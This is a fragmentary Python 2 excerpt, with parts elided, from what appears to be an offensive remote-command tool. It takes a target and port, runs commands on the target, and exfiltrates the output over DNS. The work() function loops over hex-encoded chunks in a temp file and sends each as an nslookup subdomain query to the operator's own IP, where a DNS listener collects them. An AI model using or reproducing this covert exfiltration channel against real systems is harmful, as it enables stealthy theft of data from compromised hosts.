...
from dns import listen # dnsserver listener
def getresponse():
	listen()
...
def work(cmd):
	...
	do("sleep 1;for b in `cat /tmp/hex_asd2`;do nslookup $b.fake "+my_ip+";done;nslookup 66696e65.fake "+my_ip)
	getresponse()
...
if options.target is None or options.port is None:
	print "\n"+colored("[-] ","red")+"--target and --port option required\n"
	parser.print_help()
	print "\n"
        sys.exit()
